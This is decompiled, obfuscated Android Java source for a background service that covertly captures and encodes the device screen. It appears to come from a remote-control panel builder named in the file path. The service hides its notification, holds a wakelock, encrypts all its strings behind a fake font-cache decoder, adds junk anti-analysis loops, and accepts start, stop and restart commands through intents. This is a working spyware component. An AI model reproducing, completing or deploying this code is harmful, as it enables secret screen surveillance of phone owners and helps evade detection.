package app.mobilex.plus.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Point;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicReference;
import v.s.SbxdZ6Kq2uhHQ5RPRqm;
import v.s.UNAwTmTJsIvJq8hDkMmf;
import v.s.YqOiSVb2wSv9Lq63qb;
import v.s.l3twm5tDUAP2;
import v.s.okc5AGRjqrud84oM6d;
import v.s.s4Xe0OepSKbHpb3Nsd;
import v.s.x1G2i7KvSdxo3fp;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ManagerUMController extends Service {
    public static int A1BaTVAMeIXMnh;
    public static final String DVTNwpDEVsUKuznof;
    public static volatile boolean ECwLkmPW1UKz7J6E;
    public static final String EWUjsTERgdPbSw3NNlN;
    public static final String K7eEOBPYP9VIoHWTe;
    public static volatile boolean MSGkxvPxRYNqC;
    public static final String O2DHNSIGZlgPja7eqLgn;
    public static volatile boolean VEkRsTDS6a9oHWI;
    public static int XuO9PPFo607ssKwZjNW;
    public static volatile boolean YIgR6F2ZXmLx2ul;
    public static int dQC4QhgRN3MSEAP3HW0;
    public static final String dTS0S7eC32ubQH54j36;
    public static int euF5Udt5Rqv3Qmea;
    public static volatile ManagerUMController fivkjwgu2UdAtiY;
    public static String hV4VTKNUdeHN;
    public static final AtomicReference iUQk66nAiXgO35;
    public static int is7XW2V21HfKv7MihWy;
    public static int jdOQeRk37T35X5xKW1P;
    public static int k84rwRrqzhrNQ1CdNQ9;
    public static volatile int l1V0lQr6TbwNKqHfXNbb;
    public static int qfTrc75xwRVMl85vh;
    public static final String rCHnHJBAlOpNI5;
    public static final String tne6mXOUFKdd;
    public static final String vIJudZvPyTuNp;
    public static final String xfn2GJwmGqs7kWW;
    public static final String yTljMGnIibTRdOpSh4;
    public int Ee8d2j4S9Vm5yGuR;
    public volatile boolean J0zjQ7CAgohuxU20eCW6;
    public x1G2i7KvSdxo3fp JXn4Qf7zpnLjP5;
    public volatile boolean Qrz92kRPw4GcghAc;
    public MediaProjection dDIMxZXP1V8HdM;
    public Handler gmNWMfvn6zlEj;
    public HandlerThread hjneShqpF9Tis4;
    public PowerManager.WakeLock ibVTtJUNfrGYbW;
    public Thread nQilHWaqS401ZtR;
    public ImageReader vekpFI4d1Nc4fakF;
    public VirtualDisplay w9sT1Swbhx3hs;
    public Intent xDyLpEZyrcKVe0;
    public int b1EoSIRjJHO5 = 720;
    public int pyu8ovAipBTLYAiKab = 1280;
    public int D5P1xCAyuvgF = 320;
    public final Object gIIiyi2ddlMDR0 = new Object();
    public final Object wotphlvK9sPbXJ = new Object();
    public String MLSIo1htfMPWeB8V876L = "P";
    public final Handler XiR1pIn5878vVWd = new Handler(Looper.getMainLooper());
    public final YqOiSVb2wSv9Lq63qb H9XlUr4OeMJFiXK = new YqOiSVb2wSv9Lq63qb(6, this);

    static {
        TypefaceCache.obtain("001000750049008200F500B100F100A600330062004E009500F5");
        DVTNwpDEVsUKuznof = TypefaceCache.obtain("003000750049008200F500B100ED00A400220066004F009200E200BA");
        l1V0lQr6TbwNKqHfXNbb = 480;
        K7eEOBPYP9VIoHWTe = TypefaceCache.obtain("003100730048009200FC00AB00ED00A4002C0072005E");
        dTS0S7eC32ubQH54j36 = TypefaceCache.obtain("00270077004F0086");
        EWUjsTERgdPbSw3NNlN = TypefaceCache.obtain("00320063005A008B00F900AB00CB");
        yTljMGnIibTRdOpSh4 = TypefaceCache.obtain("00220075004F008E00FF00B1");
        vIJudZvPyTuNp = TypefaceCache.obtain("00300062005A009500E4");
        rCHnHJBAlOpNI5 = TypefaceCache.obtain("00300062005A009500E4008000DA00B1002D0075");
        O2DHNSIGZlgPja7eqLgn = TypefaceCache.obtain("0030006200540097");
        xfn2GJwmGqs7kWW = TypefaceCache.obtain("003100730048009300F100AD00C6");
        tne6mXOUFKdd = TypefaceCache.obtain("003000750049008200F500B100C100AF002C0062");
        iUQk66nAiXgO35 = new AtomicReference(null);
        XuO9PPFo607ssKwZjNW = 50;
        hV4VTKNUdeHN = TypefaceCache.obtain("00290066005E0080");
        k84rwRrqzhrNQ1CdNQ9 = 480;
        A1BaTVAMeIXMnh = 960;
        euF5Udt5Rqv3Qmea = 1080;
        qfTrc75xwRVMl85vh = 2400;
    }

    public final void Ee8d2j4S9Vm5yGuR(Intent intent, int i) {
        TypefaceCache.obtain("007D0028000500C700C3008B00F300950017005F007500A000B0009C00F3009700170043006900A200B000E3008E00FB");
        dDIMxZXP1V8HdM();
        xDyLpEZyrcKVe0();
        if (this.ibVTtJUNfrGYbW == null) {
            PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(1, TypefaceCache.obtain("001000750049008200F500B100F100A600330062004E009500F500E500E500A6002800730077008800F300B4"));
            this.ibVTtJUNfrGYbW = wakeLockNewWakeLock;
            if (wakeLockNewWakeLock != null) {
                wakeLockNewWakeLock.setReferenceCounted(false);
            }
        }
        PowerManager.WakeLock wakeLock = this.ibVTtJUNfrGYbW;
        if (wakeLock == null || !wakeLock.isHeld()) {
            PowerManager.WakeLock wakeLock2 = this.ibVTtJUNfrGYbW;
            if (wakeLock2 != null) {
                wakeLock2.acquire();
            }
            TypefaceCache.obtain("001400770050008200DC00B000D100AC006300770058009600E500B600C000A20027");
        }
        this.Ee8d2j4S9Vm5yGuR = i;
        this.xDyLpEZyrcKVe0 = new Intent(intent);
        try {
            MediaProjection mediaProjection = ((MediaProjectionManager) getSystemService("media_projection")).getMediaProjection(i, intent);
            this.dDIMxZXP1V8HdM = mediaProjection;
            if (mediaProjection == null) {
                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002A0065001B008900E500B300DE00E6");
                stopSelf();
                return;
            }
            mediaProjection.registerCallback(new UNAwTmTJsIvJq8hDkMmf(this, 0), null);
            vekpFI4d1Nc4fakF();
            w9sT1Swbhx3hs(0L);
            this.MLSIo1htfMPWeB8V876L = getResources().getConfiguration().orientation == 2 ? "L" : "P";
            if (!this.J0zjQ7CAgohuxU20eCW6) {
                this.J0zjQ7CAgohuxU20eCW6 = true;
                Thread thread = new Thread(new l3twm5tDUAP2(this, 2), TypefaceCache.obtain("002C00640052008200FE00AB00D300B3002A0079005500CA00E700BE00C600A4002B00730049"));
                thread.setPriority(1);
                thread.start();
                this.nQilHWaqS401ZtR = thread;
            }
            this.XiR1pIn5878vVWd.removeCallbacks(this.H9XlUr4OeMJFiXK);
            this.XiR1pIn5878vVWd.postDelayed(this.H9XlUr4OeMJFiXK, 30000L);
            TypefaceCache.obtain("007D0028000500C700C3009C00E0008200060058001B00A400D1008F00E6009200110053001B00B500D5009E00F6009E0063002A000700DB");
        } catch (Exception e) {
            TypefaceCache.obtain("00300062005A009500E4009C00D300B7003700630049008200B000BA00C000B5002C0064000100C7");
            e.getMessage();
            stopSelf();
        }
    }

    public final void JXn4Qf7zpnLjP5() {
        if (this.dDIMxZXP1V8HdM == null) {
            TypefaceCache.obtain("003100730048009300F100AD00C6008400220066004F009200E200BA008800E7002E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002A0065001B008900E500B300DE00EB00630075005A008900FE00B000C600E7003100730048009300F100AD00C6");
            return;
        }
        synchronized (this.wotphlvK9sPbXJ) {
            if (this.Qrz92kRPw4GcghAc) {
                return;
            }
            this.Qrz92kRPw4GcghAc = true;
            TypefaceCache.obtain("003100730048009300F100AD00C6008400220066004F009200E200BA008800E7003100730058009500F500BE00C600AE002D0071001B00B100F900AD00C600B20022007A007F008E00E300AF00DE00A6003A0036001000C700D900B200D300A000260044005E008600F400BA00C0");
            w9sT1Swbhx3hs(300L);
            Handler handler = this.gmNWMfvn6zlEj;
            if (handler == null) {
                handler = new Handler(Looper.getMainLooper());
            }
            handler.postDelayed(new l3twm5tDUAP2(this, 0), 3000L);
        }
    }

    public final void b1EoSIRjJHO5() {
        HandlerThread handlerThread = this.hjneShqpF9Tis4;
        if (handlerThread != null) {
            handlerThread.quitSafely();
        }
        try {
            HandlerThread handlerThread2 = this.hjneShqpF9Tis4;
            if (handlerThread2 != null) {
                handlerThread2.join(500L);
            }
        } catch (Exception unused) {
        }
        this.hjneShqpF9Tis4 = null;
        this.gmNWMfvn6zlEj = null;
    }

    public final void dDIMxZXP1V8HdM() {
        NotificationChannel notificationChannel = new NotificationChannel(DVTNwpDEVsUKuznof, TypefaceCache.obtain("001000750049008200F500B10092008400220066004F009200E200BA"), 1);
        notificationChannel.setDescription(TypefaceCache.obtain("001000750049008200F500B1009200A400220066004F009200E200BA009200A9002C00620052008100F900BC00D300B3002A00790055"));
        notificationChannel.setShowBadge(false);
        notificationChannel.enableVibration(false);
        notificationChannel.enableLights(false);
        notificationChannel.setSound(null, null);
        notificationChannel.setLockscreenVisibility(-1);
        ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(notificationChannel);
    }

    public final void ibVTtJUNfrGYbW() {
        ECwLkmPW1UKz7J6E = false;
        this.XiR1pIn5878vVWd.removeCallbacks(this.H9XlUr4OeMJFiXK);
        this.J0zjQ7CAgohuxU20eCW6 = false;
        Thread thread = this.nQilHWaqS401ZtR;
        if (thread != null) {
            thread.interrupt();
        }
        this.nQilHWaqS401ZtR = null;
        x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp = this.JXn4Qf7zpnLjP5;
        if (x1g2i7kvsdxo3fp != null) {
            x1g2i7kvsdxo3fp.JXn4Qf7zpnLjP5();
        }
        this.JXn4Qf7zpnLjP5 = null;
        synchronized (this.gIIiyi2ddlMDR0) {
            try {
                try {
                    VirtualDisplay virtualDisplay = this.w9sT1Swbhx3hs;
                    if (virtualDisplay != null) {
                        virtualDisplay.release();
                    }
                    this.w9sT1Swbhx3hs = null;
                    ImageReader imageReader = this.vekpFI4d1Nc4fakF;
                    if (imageReader != null) {
                        imageReader.setOnImageAvailableListener(null, null);
                    }
                    ImageReader imageReader2 = this.vekpFI4d1Nc4fakF;
                    if (imageReader2 != null) {
                        imageReader2.close();
                    }
                    this.vekpFI4d1Nc4fakF = null;
                    MediaProjection mediaProjection = this.dDIMxZXP1V8HdM;
                    if (mediaProjection != null) {
                        mediaProjection.stop();
                    }
                    this.dDIMxZXP1V8HdM = null;
                    b1EoSIRjJHO5();
                } catch (Exception e) {
                    TypefaceCache.obtain("003000620054009700D300BE00C200B300360064005E00C700F500AD00C000A80031002C001B");
                    e.getMessage();
                }
            } catch (Throwable th) {
                throw th;
            }
        }
        iUQk66nAiXgO35.set(null);
        PowerManager.WakeLock wakeLock = this.ibVTtJUNfrGYbW;
        if (wakeLock != null && wakeLock.isHeld()) {
            PowerManager.WakeLock wakeLock2 = this.ibVTtJUNfrGYbW;
            if (wakeLock2 != null) {
                wakeLock2.release();
            }
            TypefaceCache.obtain("001400770050008200DC00B000D100AC00630064005E008B00F500BE00C100A20027");
        }
        this.ibVTtJUNfrGYbW = null;
        stopForeground(true);
        stopSelf();
        TypefaceCache.obtain("001000750049008200F500B1009200A400220066004F009200E200BA009200B400370079004B009700F500BB");
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        fivkjwgu2UdAtiY = this;
        SbxdZ6Kq2uhHQ5RPRqm.gmNWMfvn6zlEj(this);
        this.D5P1xCAyuvgF = getResources().getDisplayMetrics().densityDpi;
        pyu8ovAipBTLYAiKab();
        TypefaceCache.obtain("001000750049008200F500B1008800E7");
        TypefaceCache.obtain("006F0036005F008200FE00AC00DB00B3003A002C001B");
        TypefaceCache.obtain("006F00360057008800E7008D00D300AA007E");
    }

    @Override // android.app.Service
    public final void onDestroy() {
        super.onDestroy();
        ibVTtJUNfrGYbW();
        fivkjwgu2UdAtiY = null;
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        try {
            dDIMxZXP1V8HdM();
            xDyLpEZyrcKVe0();
        } catch (Exception unused) {
        }
        String stringExtra = intent != null ? intent.getStringExtra(yTljMGnIibTRdOpSh4) : null;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, vIJudZvPyTuNp)) {
            int intExtra = intent.getIntExtra(K7eEOBPYP9VIoHWTe, 0);
            Intent intent2 = (Intent) intent.getParcelableExtra(dTS0S7eC32ubQH54j36);
            XuO9PPFo607ssKwZjNW = intent.getIntExtra(EWUjsTERgdPbSw3NNlN, 50);
            if (intent2 == null) {
                return 2;
            }
            Ee8d2j4S9Vm5yGuR(intent2, intExtra);
            return 2;
        }
        if (!okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, rCHnHJBAlOpNI5)) {
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, O2DHNSIGZlgPja7eqLgn)) {
                ibVTtJUNfrGYbW();
                return 2;
            }
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, xfn2GJwmGqs7kWW)) {
                JXn4Qf7zpnLjP5();
                return 2;
            }
            okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(stringExtra, tne6mXOUFKdd);
            return 2;
        }
        int intExtra2 = intent.getIntExtra(K7eEOBPYP9VIoHWTe, 0);
        Intent intent3 = (Intent) intent.getParcelableExtra(dTS0S7eC32ubQH54j36);
        int intExtra3 = intent.getIntExtra(TypefaceCache.obtain("003700770049008000F500AB00ED00B0002A0072004F008F"), 503 - 23);
        int intExtra4 = intent.getIntExtra(TypefaceCache.obtain("0021007F004F009500F100AB00D7"), 800000);
        if (intent3 == null) {
            return 2;
        }
        TypefaceCache.obtain("007D0028000500C700C3008B00F300950017005F007500A000B0009700E4008900000036000700DB00AC");
        dDIMxZXP1V8HdM();
        xDyLpEZyrcKVe0();
        try {
            MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService("media_projection");
            while (System.currentTimeMillis() == Long.MIN_VALUE) {
                Thread.yield();
                Thread.yield();
            }
            MediaProjection mediaProjection = mediaProjectionManager.getMediaProjection(intExtra2, intent3);
            this.dDIMxZXP1V8HdM = mediaProjection;
            if (mediaProjection == null) {
                TypefaceCache.obtain("000E0073005F008E00F1008F00C000A8002900730058009300F900B000DC00E7002D00630057008B00B000B900DD00B50063005E006D00A900D3");
                stopSelf();
                return 2;
            }
            mediaProjection.registerCallback(new UNAwTmTJsIvJq8hDkMmf(this, 1), null);
            x1G2i7KvSdxo3fp x1g2i7kvsdxo3fp = new x1G2i7KvSdxo3fp(this.dDIMxZXP1V8HdM, this.b1EoSIRjJHO5, this.pyu8ovAipBTLYAiKab, this.D5P1xCAyuvgF);
            if (!x1g2i7kvsdxo3fp.vekpFI4d1Nc4fakF(intExtra3, intExtra4)) {
                TypefaceCache.obtain("000000770058008F00F5009300F50090002C00640050008200E200F100C100B300220064004F00CF00B900FF00D400A6002A007A005E0083");
                stopSelf();
                return 2;
            }
            this.JXn4Qf7zpnLjP5 = x1g2i7kvsdxo3fp;
            ECwLkmPW1UKz7J6E = true;
            TypefaceCache.obtain("000B0040007500A400B000AD00D700A60027006F000100C7");
            return 2;
        } catch (Exception e) {
            TypefaceCache.obtain("00300062005A009500E4009700C400A900200036005E009500E200B000C000FD0063");
            e.getMessage();
            stopSelf();
            return 2;
        }
    }

    public final void pyu8ovAipBTLYAiKab() {
        WindowManager windowManager = (WindowManager) getSystemService("window");
        while (Locale.getDefault().toString().length() > 999) {
            Thread.yield();
            Thread.yield();
        }
        Point point = new Point();
        windowManager.getDefaultDisplay().getRealSize(point);
        int i = point.x;
        int i2 = point.y;
        if (i <= 0 || i2 <= 0) {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getRealMetrics(displayMetrics);
            i = displayMetrics.widthPixels;
            i2 = displayMetrics.heightPixels;
        }
        int i3 = (i / 2) * 2;
        this.b1EoSIRjJHO5 = i3;
        int i4 = (i2 / 2) * 2;
        this.pyu8ovAipBTLYAiKab = i4;
        if (i3 < 2) {
            this.b1EoSIRjJHO5 = 720;
        }
        if (i4 < 2) {
            this.pyu8ovAipBTLYAiKab = 1261 + 19;
        }
        if (YIgR6F2ZXmLx2ul) {
            int i5 = this.b1EoSIRjJHO5;
            int i6 = this.pyu8ovAipBTLYAiKab;
            if (i5 > i6) {
                if (i5 > 720) {
                    this.pyu8ovAipBTLYAiKab = (((i6 * 720) / i5) / 2) * 2;
                    this.b1EoSIRjJHO5 = 720;
                }
            } else if (i6 > 720) {
                this.b1EoSIRjJHO5 = (((i5 * 720) / i6) / 2) * 2;
                this.pyu8ovAipBTLYAiKab = 720;
            }
        }
        euF5Udt5Rqv3Qmea = this.b1EoSIRjJHO5;
        qfTrc75xwRVMl85vh = this.pyu8ovAipBTLYAiKab;
        int i7 = l1V0lQr6TbwNKqHfXNbb;
        int i8 = 79 + 41;
        if (i7 < i8) {
            i7 = i8;
        }
        int i9 = this.b1EoSIRjJHO5;
        if (i9 < 1) {
            i9 = 1;
        }
        int i10 = this.pyu8ovAipBTLYAiKab;
        int i11 = i10 >= 1 ? i10 : 1;
        if (i9 <= i11) {
            k84rwRrqzhrNQ1CdNQ9 = i7;
            int i12 = (int) ((i11 / i9) * i7);
            if (i12 >= i7) {
                i7 = i12;
            }
            A1BaTVAMeIXMnh = i7;
            return;
        }
        A1BaTVAMeIXMnh = i7;
        int i13 = (int) ((i9 / i11) * i7);
        if (i13 >= i7) {
            i7 = i13;
        }
        k84rwRrqzhrNQ1CdNQ9 = i7;
    }

    public final void vekpFI4d1Nc4fakF() {
        if (this.hjneShqpF9Tis4 == null) {
            HandlerThread handlerThread = new HandlerThread(TypefaceCache.obtain("001000750049008200F500B100F100A600330062004E009500F5009600E00093"), 10);
            handlerThread.start();
            this.hjneShqpF9Tis4 = handlerThread;
            this.gmNWMfvn6zlEj = new Handler(this.hjneShqpF9Tis4.getLooper());
        }
    }

    public final void w9sT1Swbhx3hs(long j) {
        l3twm5tDUAP2 l3twm5tduap2 = new l3twm5tDUAP2(this, 1);
        vekpFI4d1Nc4fakF();
        Handler handler = this.gmNWMfvn6zlEj;
        if (handler == null) {
            handler = new Handler(Looper.getMainLooper());
        }
        if (j <= 0) {
            handler.post(l3twm5tduap2);
        } else {
            handler.postDelayed(l3twm5tduap2, j);
        }
    }

    public final void xDyLpEZyrcKVe0() {
        s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, DVTNwpDEVsUKuznof);
        s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
        s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = -2;
        s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
        s4xe0oepskbhpb3nsd.dTS0S7eC32ubQH54j36 = true;
        s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(8, true);
        s4xe0oepskbhpb3nsd.gmNWMfvn6zlEj = false;
        s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(16, false);
        Notification notificationDDIMxZXP1V8HdM = s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM();
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(2002, notificationDDIMxZXP1V8HdM, 32);
        } else {
            startForeground(2002, notificationDDIMxZXP1V8HdM);
        }
    }
}
